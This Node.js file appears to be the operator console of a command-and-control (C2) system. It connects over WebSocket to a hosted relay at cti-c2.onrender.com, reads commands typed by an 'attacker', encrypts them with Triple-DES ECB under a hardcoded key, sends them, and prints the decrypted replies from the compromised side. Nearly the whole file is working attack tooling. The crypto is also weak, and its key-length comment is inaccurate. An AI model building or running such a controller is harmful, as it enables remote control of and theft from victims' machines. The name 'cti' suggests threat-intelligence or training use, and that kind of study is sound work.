const WebSocket = require("ws");
const readline = require("readline");
const crypto = require("crypto");
const fs = require("fs");

// C2 server configuration
const C2_SERVER_HOST = "127.0.0.1";
const C2_SERVER_PORT = 4000;
// Create a TCP socket to connect to the C2 server
// const socket = new net.Socket();
// const socket = new WebSocket(`ws://${C2_SERVER_HOST}:${C2_SERVER_PORT}`);
const socket = new WebSocket(`wss://cti-c2.onrender.com`);

// Function to encrypt plaintext using Triple-DES ECB
function encryptText(text, key) {
  const cipher = crypto.createCipheriv("des-ede3-ecb", key, Buffer.alloc(0));
  let encrypted = cipher.update(text, "utf8", "base64");
  encrypted += cipher.final("base64");
  return encrypted;
}

// Function to decrypt Triple-DES ECB ciphertext
function decryptText(encryptedText, key) {
  const decipher = crypto.createDecipheriv(
    "des-ede3-ecb",
    key,
    Buffer.alloc(0)
  );
  let decrypted = decipher.update(encryptedText, "base64", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

// Example usage
const encryptionKey = Buffer.from("aaaab16vccharacterkeaaay", "utf8"); // Use a 16-character key for 3DES (24 bytes)

let rl;

// Function to handle prompt and socket interactions
function promptCommand() {
  rl.question(
    '\nEnter a command for the C2 server (or type "exit" to quit): \n',
    (command) => {
      if (command.toLowerCase() === "exit") {
        rl.close();
        socket.end(); // Close the socket and terminate script
        return;
      }

      // console.log(`Sending command to C2 server: attacker: ${command}`);

      const encryptedCommand = encryptText(command, encryptionKey);
      const sendMessage = "_attacker_" + encryptedCommand;
      socket.send(sendMessage);
      promptCommand();
    }
  );
}

socket.on("open", () => {
  console.log(`[*] Connected to C2 server ${C2_SERVER_HOST}:${C2_SERVER_PORT}`);
  rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  promptCommand();
});

// Handle incoming data from the C2 server
socket.on("message", (data) => {
  const response = data.toString();
  console.log(`Received response from C2 server: ${response}`);
  console.log(decryptText(response, encryptionKey));
});

// Handle socket close
socket.on("close", () => {
  console.log("[*] Connection to C2 server closed");
});

// Handle socket error
socket.on("error", (err) => {
  console.error(`[!] Socket error: ${err.message}`);
});
